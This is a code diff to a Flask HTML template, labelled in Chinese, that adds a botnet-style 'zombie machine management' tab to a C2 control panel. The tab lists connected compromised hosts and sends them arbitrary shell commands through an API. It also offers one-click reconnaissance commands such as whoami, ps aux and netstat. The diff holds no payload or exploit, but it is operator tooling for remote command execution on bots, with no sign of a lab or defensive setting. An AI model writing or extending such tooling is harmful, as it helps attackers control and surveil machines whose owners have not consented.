@@ -18,19 +18,72 @@
     {% endif %}
     {% endwith %}
 
-    <h2>控制消息</h2>
-    <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>
-    <form method="post" action="{{ url_for('control.add_message') }}">
-        <div class="form-group">
-            <label class="form-label" for="message">控制消息</label>
-            <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>
+    <!-- 選項卡導航 -->
+    <div class="tab-navigation">
+        <button class="tab-btn active" onclick="showTab('messages')">📨 控制消息</button>
+        <button class="tab-btn" onclick="showTab('zombies')">🧟 殭屍管理</button>
+    </div>
+
+    <!-- 控制消息選項卡 -->
+    <div id="messages-tab" class="tab-content active">
+        <h2>控制消息</h2>
+        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>
+        <form method="post" action="{{ url_for('control.add_message') }}">
+            <div class="form-group">
+                <label class="form-label" for="message">控制消息</label>
+                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>
+            </div>
+            <div class="form-group">
+                <label class="form-label" for="target_ip">目標IP地址</label>
+                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">
+            </div>
+            <button type="submit">發送消息</button>
+        </form>
+    </div>
+
+    <!-- 殭屍管理選項卡 -->
+    <div id="zombies-tab" class="tab-content">
+        <h2>殭屍機器管理</h2>
+        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>
+
+        <!-- 殭屍機器列表 -->
+        <div class="zombie-controls">
+            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>
+            <div id="zombie-count" class="zombie-count">載入中...</div>
         </div>
-        <div class="form-group">
-            <label class="form-label" for="target_ip">目標IP地址</label>
-            <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">
+
+        <div id="zombie-list" class="zombie-list">
+            <!-- 殭屍機器將通過JavaScript動態載入 -->
         </div>
-        <button type="submit">發送消息</button>
-    </form>
+
+        <!-- 命令發送表單 -->
+        <div class="command-form-container" style="display: none;" id="command-form-container">
+            <h3>發送命令給殭屍機器</h3>
+            <form id="command-form">
+                <div class="form-group">
+                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>
+                    <input type="text" id="selected-zombie" readonly>
+                </div>
+                <div class="form-group">
+                    <label class="form-label" for="command">執行命令</label>
+                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">常用命令</label>
+                    <div class="quick-commands">
+                        <button type="button" class="quick-cmd-btn" onclick="setCommand('whoami')">whoami</button>
+                        <button type="button" class="quick-cmd-btn" onclick="setCommand('pwd')">pwd</button>
+                        <button type="button" class="quick-cmd-btn" onclick="setCommand('ls -la')">ls -la</button>
+                        <button type="button" class="quick-cmd-btn" onclick="setCommand('ps aux')">ps aux</button>
+                        <button type="button" class="quick-cmd-btn"
+                            onclick="setCommand('netstat -tuln')">netstat</button>
+                    </div>
+                </div>
+                <button type="submit">💀 發送命令</button>
+                <button type="button" onclick="hideCommandForm()">取消</button>
+            </form>
+        </div>
+    </div>
     <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">
         <h1 style="margin: 0;">已經知道的消息列表</h1>
         <a href="{{ url_for('control.help_page') }}" class="help-btn">📚 查看使用說明</a>
@@ -52,4 +105,141 @@
     </div>
 </div>
 <link rel="stylesheet" href="{{ url_for('static', filename='css/control_message.css') }}">
+
+<script>
+    // 選項卡切換功能
+    function showTab(tabName) {
+        // 隱藏所有選項卡內容
+        const tabContents = document.querySelectorAll('.tab-content');
+        tabContents.forEach(tab => {
+            tab.classList.remove('active');
+        });
+
+        // 移除所有選項卡按鈕的活動狀態
+        const tabBtns = document.querySelectorAll('.tab-btn');
+        tabBtns.forEach(btn => {
+            btn.classList.remove('active');
+        });
+
+        // 顯示選中的選項卡
+        document.getElementById(tabName + '-tab').classList.add('active');
+        event.target.classList.add('active');
+
+        // 如果切換到殭屍管理選項卡，自動載入殭屍列表
+        if (tabName === 'zombies') {
+            loadZombies();
+        }
+    }
+
+    // 載入殭屍機器列表
+    async function loadZombies() {
+        try {
+            const response = await fetch('/api/control/get_zombies');
+            const data = await response.json();
+
+            const zombieCountEl = document.getElementById('zombie-count');
+            const zombieListEl = document.getElementById('zombie-list');
+
+            if (data.status === 'success') {
+                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;
+
+                if (data.zombies.length === 0) {
+                    zombieListEl.innerHTML = '<div class="empty-state">目前沒有連接的殭屍機器</div>';
+                } else {
+                    let zombieHtml = '';
+                    data.zombies.forEach(zombie => {
+                        zombieHtml += `
+                        <div class="zombie-card" onclick="selectZombie('${zombie}')">
+                            <div class="zombie-info">
+                                <h4>🧟 ${zombie}</h4>
+                                <p>點擊選擇此殭屍機器</p>
+                            </div>
+                            <div class="zombie-actions">
+                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie('${zombie}')">
+                                    💀 發送命令
+                                </button>
+                            </div>
+                        </div>
+                    `;
+                    });
+                    zombieListEl.innerHTML = zombieHtml;
+                }
+            } else {
+                zombieCountEl.textContent = '載入失敗';
+                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;
+            }
+        } catch (error) {
+            console.error('載入殭屍列表失敗:', error);
+            document.getElementById('zombie-count').textContent = '載入失敗';
+            document.getElementById('zombie-list').innerHTML = '<div class="error-state">網路錯誤</div>';
+        }
+    }
+
+    // 選擇殭屍機器
+    function selectZombie(zombieIp) {
+        document.getElementById('selected-zombie').value = zombieIp;
+        document.getElementById('command-form-container').style.display = 'block';
+        document.getElementById('command').focus();
+    }
+
+    // 隱藏命令表單
+    function hideCommandForm() {
+        document.getElementById('command-form-container').style.display = 'none';
+        document.getElementById('command').value = '';
+        document.getElementById('selected-zombie').value = '';
+    }
+
+    // 設置快速命令
+    function setCommand(cmd) {
+        document.getElementById('command').value = cmd;
+    }
+
+    // 發送命令給殭屍機器
+    document.getElementById('command-form').addEventListener('submit', async function (e) {
+        e.preventDefault();
+
+        const zombieIp = document.getElementById('selected-zombie').value;
+        const command = document.getElementById('command').value;
+
+        if (!zombieIp || !command) {
+            alert('請選擇殭屍機器並輸入命令');
+            return;
+        }
+
+        try {
+            const formData = new FormData();
+            formData.append('command', command);
+
+            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {
+                method: 'POST',
+                body: formData
+            });
+
+            if (response.ok) {
+                alert(`命令已發送給 ${zombieIp}`);
+                hideCommandForm();
+            } else {
+                const errorData = await response.json();
+                alert(`發送失敗: ${errorData.error}`);
+            }
+        } catch (error) {
+            console.error('發送命令失敗:', error);
+            alert('發送命令時發生網路錯誤');
+        }
+    });
+
+    // 刷新殭屍列表
+    document.getElementById('refresh-zombies').addEventListener('click', loadZombies);
+
+    // 頁面載入時檢查當前選項卡
+    document.addEventListener('DOMContentLoaded', function () {
+        // 檢查URL參數是否指定了選項卡
+        const urlParams = new URLSearchParams(window.location.search);
+        const tab = urlParams.get('tab');
+        if (tab === 'zombies') {
+            showTab('zombies');
+        }
+    });
+</script>
+
 {% endblock %}
